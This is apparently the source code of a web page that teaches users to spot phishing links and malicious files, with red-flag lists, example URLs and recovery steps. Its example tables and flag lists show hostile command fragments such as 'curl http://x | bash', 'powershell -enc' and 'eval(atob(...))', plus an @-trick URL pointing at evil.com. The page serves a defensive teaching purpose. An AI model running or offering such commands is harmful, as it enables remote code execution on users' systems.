import type { Metadata } from "next";
import Link from "next/link";

export const metadata: Metadata = { title: "Learn to spot phishing & malware" };

const URL_FLAGS = [
  { t: "Urgent / threatening language", d: "“Your account will be closed in 24h!” — pressure stops you thinking. Real companies rarely threaten by email/SMS." },
  { t: "Mismatched sender & link domains", d: "Hover links: does the domain match the brand? paypaI-secure.tk is not paypal.com. Watch hyphens, digits and odd TLDs." },
  { t: "Lookalike domains (homoglyphs)", d: "arnazon, g00gle, xn-- punycode tricks. Type important addresses manually instead of clicking." },
  { t: "Requests for passwords / OTPs", d: "No legit support agent will ask for your password, OTP or seed phrase. Ever." },
  { t: "Unexpected attachments / downloads", d: ".zip, .iso, .scr, Office macros — classic malware delivery. Verify via a second channel first." },
  { t: "Too-good-to-be-true offers", d: "Free crypto, prize wins, 90%-off stores that only take UPI/crypto — assume scam until proven otherwise." },
];

const FILE_FLAGS = [
  { t: "Double extensions", d: "invoice.pdf.exe, photo.jpg.scr — Windows hides known extensions by default, so you see only the fake one." },
  { t: "Wrong icon / type", d: "An 'image' or 'document' that asks to Enable Macros or runs when opened is malware until proven otherwise." },
  { t: "Unexpected macros & scripts", d: ".docm, .xlsm, .hta, .vbs, .ps1 arriving by mail — the classic initial-access vector." },
  { t: "Encoded commands", d: "powershell -enc, IEX, curl|bash, /dev/tcp — living-off-the-land tricks. Our file scanner flags these inside files too." },
  { t: "Packed / huge entropy", d: "Legit installers are signed. Unsigned, packed blobs demanding admin rights deserve a sandbox, not a double-click." },
  { t: "Password-protected zips", d: "'Use password infected to open' defeats email AV scanning. Confirm with the sender out-of-band first." },
];

export default function LearnPage() {
  return (
    <section>
      <div className="wrap prose">
        <span className="kicker">Phishing + malware 101</span>
        <h1>Learn to spot phishing, viruses & malicious code</h1>
        <p>
          Blocklists catch known-bad sites, but zero-day pages go up every
          minute — and malware arrives as “helpful” attachments. These red
          flags power the engines in our <Link href="/scan">URL scanner</Link> and{" "}
          <Link href="/analyze">file & code lab</Link>.
        </p>
        <h2>🚩 Phishing links: 6 red flags</h2>
        <div className="grid c2" style={{ marginTop: 16 }}>
          {URL_FLAGS.map((f) => (
            <div key={f.t} className="feature"><h3>{f.t}</h3><p>{f.d}</p></div>
          ))}
        </div>
        <h2>🔬 Shady URL examples</h2>
        <table className="table">
          <thead><tr><th>You see</th><th>Why it&apos;s suspicious</th></tr></thead>
          <tbody>
            <tr><td><code>http://192.168.1.10/login</code></td><td>Raw IP host + no HTTPS</td></tr>
            <tr><td><code>https://paypal-secure-verify.tk/signin</code></td><td>Hyphens + lure words + risky TLD</td></tr>
            <tr><td><code>https://bit.ly/3xYzA9</code> in a &quot;bank&quot; SMS</td><td>Shortener hides destination</td></tr>
            <tr><td><code>https://login.example.com@evil.com/</code></td><td>@ trick — real host is evil.com</td></tr>
          </tbody>
        </table>
        <h2>🦠 Malicious files: 6 red flags</h2>
        <div className="grid c2" style={{ marginTop: 16 }}>
          {FILE_FLAGS.map((f) => (
            <div key={f.t} className="feature"><h3>{f.t}</h3><p>{f.d}</p></div>
          ))}
        </div>
        <h2>🔬 Shady file/code examples</h2>
        <table className="table">
          <thead><tr><th>You see</th><th>Why it&apos;s suspicious</th></tr></thead>
          <tbody>
            <tr><td><code>Invoice.pdf.exe</code></td><td>Double extension — it&apos;s a program, not a PDF</td></tr>
            <tr><td><code>eval(atob(&quot;eHh4…&quot;))</code></td><td>Base64 decode + execute — packed payload</td></tr>
            <tr><td><code>powershell -enc SQBFAFgA…</code></td><td>Encoded command hides intent</td></tr>
            <tr><td><code>curl http://x | bash</code></td><td>Remote code execution, no verification</td></tr>
          </tbody>
        </table>
        <h2>🆘 Clicked or ran something bad?</h2>
        <ol>
          <li>Disconnect / close it. Don&apos;t enter anything else or run the file again.</li>
          <li>Passwords typed? Change them everywhere reused + enable 2FA.</li>
          <li>Card/UPI details entered? Freeze via your bank app and call the bank.</li>
          <li>File executed? Assume compromise: disconnect, full AV scan, rotate secrets, restore from clean backup if needed.</li>
          <li>Report phishing SMS to 7726 (SPAM).</li>
        </ol>
        <div className="note">
          Golden rules: for banks/crypto — never click in, open the official
          app. For files — never double-click to “test”; drop them in the{" "}
          <Link href="/analyze">file scanner</Link> first (it never uploads).
        </div>
        <p>
          <Link href="/scan">→ Scan a suspicious link</Link> ·{" "}
          <Link href="/analyze">→ Scan a file or code</Link>
        </p>
      </div>
    </section>
  );
}
